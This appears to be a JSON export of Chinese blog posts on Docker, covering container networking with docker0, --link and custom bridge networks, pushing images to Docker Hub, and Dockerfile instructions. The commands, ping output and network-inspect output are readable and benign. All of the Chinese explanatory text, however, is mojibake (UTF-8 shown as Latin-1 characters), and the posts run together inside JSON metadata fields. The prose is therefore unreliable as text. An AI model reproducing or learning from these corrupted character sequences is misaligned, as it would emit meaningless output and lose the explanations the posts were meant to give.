forever#æ€è€ƒã€‚æœ¬æœºèƒ½å¦pingé€šdockerå®¹å™¨å†…éƒ¨ã€‚ç­”æ¡ˆæ˜¯èƒ½ï¼Œå› ä¸ºåœ¨åŒä¸€ç½‘æ®µ[root@VM-0-15-centos ~]# ping 172.18.0.6PING 172.18.0.6 (172.18.0.6) 56(84) bytes of data.64 bytes from 172.18.0.6: icmp_seq=1 ttl=64 time=0.094 ms64 bytes from 172.18.0.6: icmp_seq=2 ttl=64 time=0.055 ms64 bytes from 172.18.0.6: icmp_seq=3 ttl=64 time=0.051 ms64 bytes from 172.18.0.6: icmp_seq=4 ttl=64 time=0.053 ms^C--- 172.18.0.6 ping statistics ---4 packets transmitted, 4 received, 0% packet loss, time 2999msrtt min/avg/max/mdev = 0.051/0.063/0.094/0.018 ms 3ã€åŸç†&emsp;&emsp;æˆ‘ä»¬æ¯å¯åŠ¨ä¸€ä¸ªdockerå®¹å™¨ï¼Œdockerå°±ä¼šç»™å®¹å™¨åˆ†é…ä¸€ä¸ªIPï¼Œæˆ‘ä»¬åªè¦å®‰è£…äº†dockerï¼Œå°±ä¼šæœ‰ä¸€ä¸ªç½‘å¡docker0ï¼Œä½¿ç”¨çš„æ¨¡å¼æ˜¯æ¡¥æ¥æ¨¡å¼ï¼Œä½¿ç”¨çš„æŠ€æœ¯æ˜¯veth-pairæŠ€æœ¯ &emsp;&emsp;æ¯”å¦‚å¯åŠ¨tomcat2å®¹å™¨åï¼Œå†æ¬¡æŸ¥çœ‹IPï¼Œå¯ä»¥å‘ç°å¤šäº†ä¸ªç½‘å¡ &emsp;&emsp;å†å¯åŠ¨tomcat03å®¹å™¨ï¼ŒæŸ¥çœ‹å®¹å™¨IPå’Œæœ¬æœºIPï¼Œå‘ç°åˆå¤šäº†ä¸€å¯¹ç½‘å¡ &emsp;&emsp;æˆ‘ä»¬å‘ç°è¿™ä¸ªå®¹å™¨çš„ç½‘å¡éƒ½æ˜¯ä¸€å¯¹ä¸€å¯¹çš„ &emsp;&emsp;evth-pairå°±æ˜¯ä¸€å¯¹ä¸€çš„è™šæ‹Ÿæ¥å£ï¼Œå®ƒä»¬éƒ½æ˜¯æˆå¯¹å‡ºç°çš„ï¼Œä¸€ç«¯è¿ç€åè®®ï¼Œä¸€ç«¯å½¼æ­¤ç›¸è¿ã€‚æ­£å› ä¸ºæœ‰è¿™ä¸ªç‰¹æ€§ï¼Œevth-pairå……å½“ä¸€åº§æ¡¥æ¢ï¼Œè¿æ¥å„ç§è™šæ‹Ÿç½‘ç»œè®¾å¤‡ã€‚Openstackï¼ŒDockerå®¹å™¨ä¹‹é—´çš„è¿æ¥ï¼ŒOVSçš„è¿æ¥ï¼Œéƒ½æ˜¯ä½¿ç”¨evth-pairæŠ€æœ¯ &emsp;&emsp;æˆ‘ä»¬æ¥æµ‹è¯•ä¸€ä¸‹tomcat02å’Œtomcat03æ˜¯å¦å¯ä»¥pingé€š # tomcat02 ping tomcat03ï¼Œèƒ½å¤Ÿpingé€š[root@VM-0-15-centos ~]# docker exec -it tomcat02 ping 172.18.0.7PING 172.18.0.7 (172.18.0.7) 56(84) bytes of data.64 bytes from 172.18.0.7: icmp_seq=1 ttl=64 time=0.115 ms64 bytes from 172.18.0.7: icmp_seq=2 ttl=64 time=0.068 ms64 bytes from 172.18.0.7: icmp_seq=3 ttl=64 time=0.058 ms64 bytes from 172.18.0.7: icmp_seq=4 ttl=64 time=0.065 ms^C--- 172.18.0.7 ping statistics ---4 packets transmitted, 4 received, 0% packet loss, time 1002msrtt min/avg/max/mdev = 0.058/0.076/0.115/0.024 ms &emsp;&emsp;ç»˜åˆ¶ä¸€å¼ ç½‘ç»œæ¨¡å‹å›¾ &emsp;&emsp;ç»“è®ºï¼šæ‰€æœ‰çš„å®¹å™¨ä¸æŒ‡å®šç½‘ç»œçš„æƒ…å†µä¸‹ï¼Œéƒ½æ˜¯docker0è·¯ç”±çš„ï¼Œdockerä¼šç»™æˆ‘ä»¬çš„å®¹å™¨åˆ†é…ä¸€ä¸ªé»˜è®¤çš„å¯ç”¨IP 4ã€å°ç»“ &emsp;&emsp;Dockerä¸­æ‰€æœ‰çš„ç½‘ç»œæ¥å£éƒ½æ˜¯è™šæ‹Ÿçš„ã€‚è™šæ‹Ÿçš„è½¬æ³•æ•ˆç‡é«˜ï¼ &emsp;&emsp;åªè¦å®¹å™¨stopæˆ–è€…åˆ é™¤ï¼Œé‚£å¯¹åº”ç½‘æ¡¥å¯¹å°±æ²¡äº† äºŒã€å®¹å™¨äº’è”â€“link&emsp;&emsp;æ€è€ƒä¸€ä¸ªåœºæ™¯ï¼Œæˆ‘ä»¬ç¼–å†™äº†ä¸€ä¸ªå¾®æœåŠ¡ï¼Œdatabase url=ip:ï¼Œé¡¹ç›®ä¸é‡å¯ï¼Œæ•°æ®åº“IPæ¢æ‰äº†ï¼Œæˆ‘ä»¬å¸Œæœ›å¯ä»¥å¤„ç†è¿™ä¸ªé—®é¢˜ï¼Œå¯ä»¥åå­—æ¥è®¿é—®å®¹å™¨ï¼Œé‚£è¯¥æ€ä¹ˆåšï¼Ÿ #å°è¯•ç›´æ¥pingå®¹å™¨åï¼Œpingä¸é€š [root@VM-0-15-centos ~]# docker exec -it tomcat02 ping tomcat03ping: tomcat03: Name or service not known#é€šè¿‡--linkå¯ä»¥è§£å†³#å¯åŠ¨tomcat4ï¼Œå¹¶å…³è”tomcat03ï¼Œtomcat04å¯ä»¥é€šè¿‡ç›´æ¥pingå®¹å™¨å tomcat03 pingé€š[root@VM-0-15-centos ~]# docker run -d -P --name tomcat04 --link tomcat03 tomcataa09aa2dbd2425f5e54fa89259069f82523c821ebec865ad452238d7ad8f9fd5[root@VM-0-15-centos ~]# docker exec -it tomcat04 ping tomcat03PING tomcat03 (172.18.0.7) 56(84) bytes of data.64 bytes from tomcat03 (172.18.0.7): icmp_seq=1 ttl=64 time=0.114 ms64 bytes from tomcat03 (172.18.0.7): icmp_seq=2 ttl=64 time=0.065 ms64 bytes from tomcat03 (172.18.0.7): icmp_seq=3 ttl=64 time=0.065 ms64 bytes from tomcat03 (172.18.0.7): icmp_seq=4 ttl=64 time=0.065 ms^C--- tomcat03 ping statistics ---4 packets transmitted, 4 received, 0% packet loss, time 1002msrtt min/avg/max/mdev = 0.065/0.077/0.114/0.022 ms#ä½†æ˜¯åå‘pingï¼Œtomcat03æ— æ³•ç›´æ¥é€šè¿‡pingå®¹å™¨åpingé€š[root@VM-0-15-centos ~]# docker exec -it tomcat03 ping tomcat04ping: tomcat04: Name or service not known &emsp;&emsp;æŸ¥çœ‹tomcat04çš„/etc/hostsæ–‡ä»¶ &emsp;&emsp;æŸ¥çœ‹tomcat03çš„/etc/hostsæ–‡ä»¶ &emsp;&emsp;â€“linkå°±æ˜¯åœ¨hostsé…ç½®ä¸­å¢åŠ äº†ä¸€æ¡è§£æ &emsp;&emsp;ä¸æ¨èä½¿ç”¨â€“linkã€‚docker0é—®é¢˜ï¼šå®ƒä¸æ”¯æŒå®¹å™¨åç›´æ¥è®¿é—® ä¸‰ã€è‡ªå®šä¹‰ç½‘ç»œ&emsp;&emsp;è‡ªå®šä¹‰çš„ç½‘ç»œå®Œå–„äº†docker0ä¸æ”¯æŒå®¹å™¨åè®¿é—®çš„ç¼ºç‚¹å’Œâ€“linkä¸èƒ½ç›¸äº’pingé€šçš„ç¼ºç‚¹ï¼Œåªè¦æ˜¯åœ¨åŒä¸€è‡ªå®šä¹‰ç½‘ç»œä¸‹ï¼Œéƒ½èƒ½ç›´æ¥é€šè¿‡å®¹å™¨åç›¸äº’pingé€š &emsp;&emsp;æŸ¥çœ‹æ‰€æœ‰çš„dockerç½‘ç»œï¼šdocker network ls 1ã€ç½‘ç»œæ¨¡å¼bridgeï¼šæ¡¥æ¥ï¼ˆé»˜è®¤ï¼Œè‡ªå·±åˆ›å»ºä¹Ÿä½¿ç”¨bridgeæ¨¡å¼ï¼‰noneï¼šä¸é…ç½®ç½‘ç»œhostï¼šå’Œå®¿ä¸»æœºå…±äº«ç½‘ç»œcontainerï¼šå®¹å™¨ç½‘ç»œè¿é€šï¼ˆç”¨çš„å°‘ï¼Œå±€é™æ€§å¤§ï¼‰ 2ã€æµ‹è¯•# æˆ‘ä»¬ç›´æ¥å¯åŠ¨çš„å‘½ä»¤ --net bridgeï¼Œè€Œè¿™ä¸ªå°±æ˜¯æˆ‘ä»¬çš„docker0docker run -d -P --name tomcat02 tomcatç­‰ä»·äºdocker run -d -P --name tomcat02 --net bridge tomcat# docker0ç‰¹ç‚¹ï¼šé»˜è®¤ï¼Œå®¹å™¨åä¸èƒ½è®¿é—®ï¼Œ--linkå¯ä»¥æ‰“é€šè¿æ¥#æˆ‘ä»¬å¯ä»¥ç”¨createå‘½ä»¤è‡ªå®šä¹‰ä¸€ä¸ªç½‘ç»œ# --driver bridgeï¼ˆé»˜è®¤ï¼‰# --subnet 192.168.0.0/16ï¼ˆå­ç½‘æ©ç ï¼‰# --gateway 192.168.0.1ï¼ˆç½‘å…³ï¼‰[root@VM-0-15-centos ~]# docker network create --driver bridge --subnet 192.168.0.0/16 --gateway 192.168.0.1 mynetb93f7bc668c46baa7657025e029f13022c8c529e33b2eec1a73d2e29cd4af340# lså‘½ä»¤æŸ¥çœ‹ç½‘ç»œï¼Œæˆ‘ä»¬è‡ªå·±çš„ç½‘ç»œåˆ›å»ºå¥½äº†[root@VM-0-15-centos ~]# docker network lsNETWORK ID NAME DRIVER SCOPE115a2351052d bridge bridge locala8299a5d2f22 host host localb93f7bc668c4 mynet bridge local #ï¼ˆmynetç½‘ç»œåˆ›å»ºæˆåŠŸï¼‰431f88da42b1 none null local# inspectå‘½ä»¤æŸ¥çœ‹meynetç½‘ç»œä¿¡æ¯[root@VM-0-15-centos ~]# docker network inspect mynet[ &#123; &quot;Name&quot;: &quot;mynet&quot;, &quot;Id&quot;: &quot;b93f7bc668c46baa7657025e029f13022c8c529e33b2eec1a73d2e29cd4af340&quot;, &quot;Created&quot;: &quot;2021-09-06T00:59:48.490085063+08:00&quot;, &quot;Scope&quot;: &quot;local&quot;, &quot;Driver&quot;: &quot;bridge&quot;, &quot;EnableIPv6&quot;: false, &quot;IPAM&quot;: &#123; &quot;Driver&quot;: &quot;default&quot;, &quot;Options&quot;: &#123;&#125;, &quot;Config&quot;: [ &#123; &quot;Subnet&quot;: &quot;192.168.0.0/16&quot;, &quot;Gateway&quot;: &quot;192.168.0.1&quot; &#125; ] &#125;, &quot;Internal&quot;: false, &quot;Attachable&quot;: false, &quot;Ingress&quot;: false, &quot;ConfigFrom&quot;: &#123; &quot;Network&quot;: &quot;&quot; &#125;, &quot;ConfigOnly&quot;: false, &quot;Containers&quot;: &#123;&#125;, &quot;Options&quot;: &#123;&#125;, &quot;Labels&quot;: &#123;&#125; &#125;]# è®¾ç½®ç½‘ç»œæ¨¡å¼ä¸ºè‡ªå·±åˆ›å»ºçš„ç½‘ç»œmynetï¼Œå»ºç«‹tomcat-net-01å’Œtomcat-net-02[root@VM-0-15-centos ~]# docker run -d -P --name tomcat-net-01 --net mynet tomcate067a02080bb5ad3bf38496c5cb5f5a6274ac3e67d3ec378106485e3c98ad470[root@VM-0-15-centos ~]# docker run -d -P --name tomcat-net-02 --net mynet tomcat830a53b87c0758aa8c985195b83b63f4e2dbebdb5e99b5bba5a39ca349a12650# inspectå‘½ä»¤æŸ¥çœ‹meynetç½‘ç»œä¿¡æ¯ï¼Œå¯ä»¥çœ‹åˆ°å¤šäº†ä¸¤ä¸ªå¯¹åº”çš„æ–°åŠ å…¥çš„containerï¼ˆå®¹å™¨ï¼‰[root@VM-0-15-centos ~]# docker network inspect mynet[root@VM-0-15-centos ~]# docker network inspect mynet[ &#123; &quot;Name&quot;: &quot;mynet&quot;, &quot;Id&quot;: &quot;b93f7bc668c46baa7657025e029f13022c8c529e33b2eec1a73d2e29cd4af340&quot;, &quot;Created&quot;: &quot;2021-09-06T00:59:48.490085063+08:00&quot;, &quot;Scope&quot;: &quot;local&quot;, &quot;Driver&quot;: &quot;bridge&quot;, &quot;EnableIPv6&quot;: false, &quot;IPAM&quot;: &#123; &quot;Driver&quot;: &quot;default&quot;, &quot;Options&quot;: &#123;&#125;, &quot;Config&quot;: [ &#123; &quot;Subnet&quot;: &quot;192.168.0.0/16&quot;, &quot;Gateway&quot;: &quot;192.168.0.1&quot; &#125; ] &#125;, &quot;Internal&quot;: false, &quot;Attachable&quot;: false, &quot;Ingress&quot;: false, &quot;ConfigFrom&quot;: &#123; &quot;Network&quot;: &quot;&quot; &#125;, &quot;ConfigOnly&quot;: false, &quot;Containers&quot;: &#123; &quot;830a53b87c0758aa8c985195b83b63f4e2dbebdb5e99b5bba5a39ca349a12650&quot;: &#123; &quot;Name&quot;: &quot;tomcat-net-02&quot;, &quot;EndpointID&quot;: &quot;d86423260674d0300b6d1da749c5dad721683966b1d4bc59e714a317c60c7df9&quot;, &quot;MacAddress&quot;: &quot;02:42:c0:a8:00:03&quot;, &quot;IPv4Address&quot;: &quot;192.168.0.3/16&quot;, &quot;IPv6Address&quot;: &quot;&quot; &#125;, &quot;e067a02080bb5ad3bf38496c5cb5f5a6274ac3e67d3ec378106485e3c98ad470&quot;: &#123; &quot;Name&quot;: &quot;tomcat-net-01&quot;, &quot;EndpointID&quot;: &quot;c182a6883d2c0f19137f5085dce4415a4eaf49d5e04cc1775a84f0e0f2482995&quot;, &quot;MacAddress&quot;: &quot;02:42:c0:a8:00:02&quot;, &quot;IPv4Address&quot;: &quot;192.168.0.2/16&quot;, &quot;IPv6Address&quot;: &quot;&quot; &#125; &#125;, &quot;Options&quot;: &#123;&#125;, &quot;Labels&quot;: &#123;&#125; &#125;]# è‡ªå®šä¹‰çš„ç½‘ç»œå®Œå–„äº†docker0ä¸æ”¯æŒå®¹å™¨åè®¿é—®çš„ç¼ºç‚¹å’Œ--linkä¸èƒ½ç›¸äº’pingé€šçš„ç¼ºç‚¹ï¼Œåªè¦æ˜¯åœ¨åŒä¸€è‡ªå®šä¹‰ç½‘ç»œä¸‹ï¼Œéƒ½èƒ½ç›´æ¥é€šè¿‡å®¹å™¨åç›¸äº’pingé€š[root@VM-0-15-centos ~]# docker exec -it tomcat-net-01 ping 192.168.0.3PING 192.168.0.3 (192.168.0.3) 56(84) bytes of data.64 bytes from 192.168.0.3: icmp_seq=1 ttl=64 time=0.096 ms64 bytes from 192.168.0.3: icmp_seq=2 ttl=64 time=0.071 ms[root@VM-0-15-centos ~]# docker exec -it tomcat-net-02 ping 192.168.0.2PING 192.168.0.2 (192.168.0.2) 56(84) bytes of data.64 bytes from 192.168.0.2: icmp_seq=1 ttl=64 time=0.084 ms64 bytes from 192.168.0.2: icmp_seq=2 ttl=64 time=0.064 ms å››ã€ç½‘ç»œè¿é€š æµ‹è¯•# å°è¯•ç”¨tomcat01 ping tomcat-net-01ï¼Œpingä¸é€šï¼Œå› ä¸ºç½‘ç»œæ²¡æœ‰è¿é€š[root@VM-0-15-centos ~]# docker exec -it tomcat01 ping tomcat-net-01ping: tomcat-net-01: Name or service not known# å°†tomcat01åŠ å…¥åˆ°ç½‘ç»œmynetä¸­[root@VM-0-15-centos ~]# docker network connect mynet tomcat01# æŸ¥çœ‹mynetçš„ä¿¡æ¯ï¼Œå¯ä»¥çœ‹åˆ°tomcat01åŠ å…¥äº†mynetï¼Œå¹¶æœ‰äº†ä¸ªIPv4åœ°å€ï¼š192.168.0.4/16[root@VM-0-15-centos ~]# docker network inspect mynet # ç›¸å½“äºç»™tomcat01ä¸€å—æ–°çš„ç½‘å¡ï¼Œè¿™å—ç½‘å¡é€‰æ‹©åŠ å…¥mynetä¸­[root@VM-0-15-centos ~]# docker exec -it tomcat01 ip addr # æœ¬æœºIPä¿¡æ¯[root@VM-0-15-centos ~]# ip addr # tomcat01å¯ä»¥pingé€štomcat-net-01äº†[root@VM-0-15-centos ~]# docker exec -it tomcat01 ping tomcat-net-01PING tomcat-net-01 (192.168.0.2) 56(84) bytes of data.64 bytes from tomcat-net-01.mynet (192.168.0.2): icmp_seq=1 ttl=64 time=0.081 ms64 bytes from tomcat-net-01.mynet (192.168.0.2): icmp_seq=2 ttl=64 time=0.065 ms64 bytes from tomcat-net-01.mynet (192.168.0.2): icmp_seq=3 ttl=64 time=0.066 ms &emsp;&emsp;ç½‘ç»œæ¨¡å‹ äº”ã€å®æˆ˜","categories":[{"name":"docker","slug":"docker","permalink":"https://wolke.cn/categories/docker/"}],"tags":[{"name":"docker","slug":"docker","permalink":"https://wolke.cn/tags/docker/"}],"author":"w01ke"},{"title":"å‘å¸ƒè‡ªå·±çš„é•œåƒ","slug":"å‘å¸ƒè‡ªå·±çš„é•œåƒ","date":"2021-12-13T12:12:35.000Z","updated":"2022-01-15T07:46:01.149Z","comments":true,"path":"post/23e16792.html","link":"","permalink":"https://wolke.cn/post/23e16792.html","excerpt":"","text":"&emsp;&emsp;åœ°å€ï¼šhttps://hub.docker.com/ æ³¨å†Œè‡ªå·±çš„è´¦å· &emsp;&emsp;åœ¨æˆ‘ä»¬æœåŠ¡å™¨ä¸Šç™»å½•è‡ªå·±çš„DockerHubè´¦å·ï¼šdocker login -u ç”¨æˆ·å -p å¯†ç  &emsp;&emsp;ç™»å½•å®Œæ¯•å°±å¯ä»¥æäº¤è‡ªå·±é•œåƒäº†ï¼šdocker push ç”¨æˆ·å/é•œåƒå:TAG è¿™é‡Œæˆ‘å…ˆç”¨docker tag é•œåƒID ...å‘½ä»¤å¯¹é•œåƒè¿›è¡Œäº†é‡å‘½åå’ŒTAGè®¾ç½® &emsp;&emsp;pushæˆåŠŸ &emsp;&emsp;æŸ¥çœ‹DockerHubçš„ç¡®ä¸Šä¼ æˆåŠŸäº†","categories":[{"name":"docker","slug":"docker","permalink":"https://wolke.cn/categories/docker/"}],"tags":[{"name":"docker","slug":"docker","permalink":"https://wolke.cn/tags/docker/"}],"author":"w01ke"},{"title":"dockerfileæ–‡ä»¶","slug":"dockerfileæ–‡ä»¶","date":"2021-12-13T12:00:16.000Z","updated":"2022-01-03T03:26:53.157Z","comments":true,"path":"post/fba1b6b.html","link":"","permalink":"https://wolke.cn/post/fba1b6b.html","excerpt":"","text":"ä¸€ã€ä»€ä¹ˆæ˜¯DockerFile&emsp;&emsp;Dockerfileæ˜¯ä¸€ä¸ªåŒ…å«ç”¨äºç»„åˆæ˜ åƒçš„å‘½ä»¤çš„æ–‡æœ¬æ–‡æ¡£ã€‚å¯ä»¥ä½¿ç”¨åœ¨å‘½ä»¤è¡Œä¸­è°ƒç”¨ä»»ä½•å‘½ä»¤ã€‚Dockeré€šè¿‡è¯»å–Dockerfileä¸­çš„æŒ‡ä»¤è‡ªåŠ¨ç”Ÿæˆæ˜ åƒã€‚ &emsp;&emsp;docker buildå‘½ä»¤ç”¨äºä»Dockerfileæ„å»ºæ˜ åƒã€‚å¯ä»¥åœ¨docker buildå‘½ä»¤ä¸­ä½¿ç”¨-fæ ‡å¿—æŒ‡å‘æ–‡ä»¶ç³»ç»Ÿä¸­ä»»ä½•ä½ç½®çš„Dockerfileã€‚ä¾‹å¦‚docker build -f /path/to/a/Dockerfile &emsp;&emsp;å¯ä»¥ç†è§£ä¸ºï¼šDockerFileæ˜¯ä»£ç ï¼Œé•œåƒæ˜¯ä»£ç å†™å¥½çš„ç±»ï¼Œå®¹å™¨æ˜¯ç±»åˆ›å»ºå‡ºæ¥çš„å¯¹è±¡ äºŒã€Dockerfileçš„åŸºæœ¬ç»“æ„DockerFile ä¸€èˆ¬åˆ†ä¸ºå››éƒ¨åˆ†ï¼š åŸºç¡€é•œåƒä¿¡æ¯ ç»´æŠ¤è€…ä¿¡æ¯ é•œåƒæ“ä½œæŒ‡ä»¤ å®¹å™¨å¯åŠ¨æ—¶æ‰§è¡ŒæŒ‡ä»¤ #ä¸º DockerFile ä¸­çš„æ³¨é‡Šã€‚ ä¸‰ã€DockerFileæ„å»ºè¿‡ç¨‹ï¼ˆ1ï¼‰æ¯ä¸ªä¿ç•™å…³é”®å­—ï¼ˆæŒ‡ä»¤ï¼‰éƒ½å¿…é¡»æ˜¯å¤§å†™å­—æ¯ ï¼ˆ2ï¼‰æŒ‡ä»¤ä»ä¸Šåˆ°ä¸‹é¡ºåºæ‰§è¡Œ ï¼ˆ3ï¼‰# è¡¨ç¤ºæ³¨é‡Š ï¼ˆ4ï¼‰æ¯ä¸€ä¸ªæŒ‡ä»¤éƒ½ä¼šåˆ›å»ºæäº¤ä¸€ä¸ªæ–°çš„é•œåƒå±‚ï¼Œå¹¶æäº¤ï¼ DockerFileæ˜¯é¢å‘å¼€å‘çš„ï¼Œæˆ‘ä»¬ä»¥åè¦å‘å¸ƒé¡¹ç›®ï¼Œåšé•œåƒï¼Œå°±éœ€è¦ç¼–å†™DockerFileæ–‡ä»¶ï¼Œè¿™ä¸ªæ–‡ä»¶ååˆ†ç®€å• Dockeré•œåƒé€æ¸æˆä¸ºä¼ä¸šäº¤ä»˜çš„æ ‡å‡†ï¼Œå¿…é¡»è¦æŒæ¡ï¼Œæ„å»ºæ­¥éª¤ 1ã€ç¼–å†™ä¸€ä¸ªDockerFileæ–‡ä»¶ 2ã€docker build æ„å»ºæˆä¸ºä¸€ä¸ªé•œåƒ 3ã€docker run è¿è¡Œé•œåƒ 4ã€docker push å‘å¸ƒé•œåƒ æ­¥éª¤ï¼šå¼€å‘ï¼Œéƒ¨ç½²ï¼Œè¿ç»´â€¦â€¦ç¼ºä¸€ä¸å¯ DockerFileï¼šæ„å»ºæ–‡ä»¶ï¼Œå®šä¹‰äº†ä¸€åˆ‡çš„æ­¥éª¤ï¼Œæºä»£ç  DockerImagesï¼šé€šè¿‡DockerFileæ„å»ºç”Ÿæˆçš„é•œåƒï¼Œæœ€ç»ˆå‘å¸ƒå’Œè¿è¡Œçš„äº§å“ Dockerå®¹å™¨ï¼šå®¹å™¨å°±æ˜¯é•œåƒè¿è¡Œèµ·æ¥æä¾›æœåŠ¡ å››ã€DockerFileæ–‡ä»¶è¯´æ˜&emsp;&emsp;Dockerä»¥ä»ä¸Šåˆ°ä¸‹çš„é¡ºåºè¿è¡ŒDockerfileçš„æŒ‡ä»¤ã€‚ä¸ºäº†æŒ‡å®šåŸºæœ¬æ˜ åƒï¼Œç¬¬ä¸€æ¡æŒ‡ä»¤å¿…é¡»æ˜¯FROMã€‚ä¸€ä¸ªå£°æ˜ä»¥ï¼ƒå­—ç¬¦å¼€å¤´åˆ™è¢«è§†ä¸ºæ³¨é‡Šã€‚å¯ä»¥åœ¨Dockeræ–‡ä»¶ä¸­ä½¿ç”¨RUNï¼ŒCMDï¼ŒFROMï¼ŒEXPOSEï¼ŒENVç­‰æŒ‡ä»¤ã€‚ 1ã€ ä¸€äº›æŒ‡ä»¤ï¼ˆ1ï¼‰FROM&emsp;&emsp;æŒ‡å®šåŸºç¡€é•œåƒï¼Œå¿…é¡»ä¸ºç¬¬ä¸€ä¸ªå‘½ä»¤ æ ¼å¼ï¼š FROM &lt;image&gt; FROM &lt;image&gt;:&lt;tag&gt; FROM &lt;image&gt;@&lt;digest&gt;ç¤ºä¾‹ï¼š FROM mysql:5.6æ³¨ï¼š tagæˆ–digestæ˜¯å¯é€‰çš„ï¼Œå¦‚æœä¸ä½¿ç”¨è¿™ä¸¤ä¸ªå€¼æ—¶ï¼Œä¼šä½¿ç”¨latestç‰ˆæœ¬çš„åŸºç¡€é•œåƒ ï¼ˆ2ï¼‰MAINTAINER&emsp;&emsp;ç»´æŠ¤è€…ä¿¡æ¯ æ ¼å¼ï¼š MAINTAINER &lt;name&gt; ç¤ºä¾‹ï¼š MAINTAINER Jasper Xu MAINTAINER sorex@163.com MAINTAINER Jasper Xu &lt;sorex@163.com&gt; ï¼ˆ3ï¼‰RUN&emsp;&emsp;æ„å»ºé•œåƒæ—¶æ‰§è¡Œçš„å‘½ä»¤ &emsp;&emsp;æ³¨æ„ï¼šRUNæŒ‡ä»¤åˆ›å»ºçš„ä¸­é—´é•œåƒä¼šè¢«ç¼“å­˜ï¼Œå¹¶ä¼šåœ¨ä¸‹æ¬¡æ„å»ºä¸­ä½¿ç”¨ã€‚å¦‚æœä¸æƒ³ä½¿ç”¨è¿™äº›ç¼“å­˜é•œåƒï¼Œå¯ä»¥åœ¨æ„å»ºæ—¶æŒ‡å®šâ€“no-cacheå‚æ•°ï¼Œå¦‚ï¼šdocker build --no-cache RUNç”¨äºåœ¨é•œåƒå®¹å™¨ä¸­æ‰§è¡Œå‘½ä»¤ï¼Œå…¶æœ‰ä»¥ä¸‹ä¸¤ç§å‘½ä»¤æ‰§è¡Œæ–¹å¼ï¼šshellæ‰§è¡Œæ ¼å¼ï¼š RUN &lt;command&gt;execæ‰§è¡Œæ ¼å¼ï¼š RUN [&quot;executable&quot;, &quot;param1&quot;, &quot;param2&quot;]ç¤ºä¾‹ï¼š RUN [&quot;executable&quot;, &quot;param1&quot;, &quot;param2&quot;] RUN apk update RUN [&quot;/etc/execfile&quot;, &quot;arg1&quot;, &quot;arg1&quot;] ï¼ˆ4ï¼‰ADD&emsp;&emsp;å°†æœ¬åœ°æ–‡ä»¶æ·»åŠ åˆ°å®¹å™¨ä¸­ï¼Œtarç±»å‹æ–‡ä»¶ä¼šè‡ªåŠ¨è§£å‹(ç½‘ç»œå‹ç¼©èµ„æºä¸ä¼šè¢«è§£å‹)ï¼Œå¯ä»¥è®¿é—®ç½‘ç»œèµ„æºï¼Œç±»ä¼¼wget æ ¼å¼ï¼š ADD &lt;src&gt;... &lt;dest&gt; ADD [&quot;&lt;src&gt;&quot;,... &quot;&lt;dest&gt;&quot;] ç”¨äºæ”¯æŒåŒ…å«ç©ºæ ¼çš„è·¯å¾„ç¤ºä¾‹ï¼š ADD hom* /mydir/ # æ·»åŠ æ‰€æœ‰ä»¥&quot;hom&quot;å¼€å¤´çš„æ–‡ä»¶ ADD hom?.txt /mydir/ # ? æ›¿ä»£ä¸€ä¸ªå•å­—ç¬¦,ä¾‹å¦‚ï¼š&quot;home.txt&quot; ADD test relativeDir/ # æ·»åŠ  &quot;test&quot; åˆ° `WORKDIR`/relativeDir/ ADD test /absoluteDir/ # æ·»åŠ  &quot;test&quot; åˆ° /absoluteDir/ ï¼ˆ5ï¼‰COPY&emsp;&emsp;åŠŸèƒ½ç±»ä¼¼ADDï¼Œä½†æ˜¯ä¸ä¼šè‡ªåŠ¨è§£å‹æ–‡ä»¶ï¼Œä¹Ÿä¸èƒ½è®¿é—®ç½‘ç»œèµ„æº ï¼ˆ6ï¼‰CMD&emsp;&emsp;æ„å»ºå®¹å™¨åè°ƒç”¨ï¼Œä¹Ÿå°±æ˜¯åœ¨å®¹å™¨å¯åŠ¨æ—¶æ‰è¿›è¡Œè°ƒç”¨ &emsp;&emsp;æ³¨æ„ï¼š CMDä¸åŒäºRUNï¼ŒCMDç”¨äºæŒ‡å®šåœ¨å®¹å™¨å¯åŠ¨æ—¶æ‰€è¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œè€ŒRUNç”¨äºæŒ‡å®šé•œåƒæ„å»ºæ—¶æ‰€è¦æ‰§è¡Œçš„å‘½ä»¤ã€‚ æ¯ä¸ªDockfileåªèƒ½æœ‰ä¸€æ¡CMDå‘½ä»¤ï¼Œå¦‚æœæŒ‡å®šäº†å¤šæ¡ï¼Œåªæœ‰æœ€åä¸€æ¡ä¼šæ‰§è¡Œã€‚ å¦‚æœç”¨æˆ·å¯åŠ¨å®¹å™¨æ—¶æŒ‡å®šäº†è¿è¡Œå‘½ä»¤ï¼Œåˆ™ä¼šè¦†ç›–CMDæŒ‡å®šå‘½ä»¤ã€‚ä¸‹é¢çš„å®æˆ˜éƒ¨åˆ†ä¼šåˆ†æè¿™éƒ¨åˆ†å†…å®¹ æ ¼å¼ï¼š CMD [&quot;executable&quot;,&quot;param1&quot;,&quot;param2&quot;] (æ‰§è¡Œå¯æ‰§è¡Œæ–‡ä»¶ï¼Œä¼˜å…ˆ) CMD [&quot;param1&quot;,&quot;param2&quot;] (è®¾ç½®äº†ENTRYPOINTï¼Œåˆ™ç›´æ¥è°ƒç”¨ENTRYPOINTæ·»åŠ å‚æ•°) CMD command param1 param2 (æ‰§è¡Œshellå†…éƒ¨å‘½ä»¤)ç¤ºä¾‹ï¼š CMD echo &quot;This is a test.&quot; | wc - CMD [&quot;/usr/bin/wc&quot;,&quot;--help&quot;] ï¼ˆ7ï¼‰ENTRYPOINT&emsp;&emsp;é…ç½®å®¹å™¨ï¼Œä½¿å…¶å¯æ‰§è¡ŒåŒ–ã€‚é…åˆCMDå¯çœå»â€applicationâ€ï¼Œåªä½¿ç”¨å‚æ•°ã€‚ &emsp;&emsp;æ³¨æ„ï¼šENTRYPOINTä¸CMDéå¸¸ç±»ä¼¼ï¼Œä¸åŒçš„æ˜¯é€šè¿‡docker runæ‰§è¡Œçš„å‘½ä»¤ä¸ä¼šè¦†ç›–ENTRYPOINTï¼Œè€Œdocker runå‘½ä»¤ä¸­æŒ‡å®šçš„ä»»ä½•å‚æ•°ï¼Œéƒ½ä¼šè¢«å½“åšå‚æ•°å†æ¬¡ä¼ é€’ç»™ENTRYPOINTã€‚Dockerfileä¸­åªå…è®¸æœ‰ä¸€ä¸ªENTRYPOINTå‘½ä»¤ï¼Œå¤šæŒ‡å®šæ—¶ä¼šè¦†ç›–å‰é¢çš„è®¾ç½®ï¼Œè€Œåªæ‰§è¡Œæœ€åçš„ENTRYPOINTæŒ‡ä»¤ã€‚ æ ¼å¼ï¼š ENTRYPOINT [&quot;executable&quot;, &quot;param1&quot;, &quot;param2&quot;] (å¯æ‰§è¡Œæ–‡ä»¶, ä¼˜å…ˆ) ENTRYPOINT command param1 param2 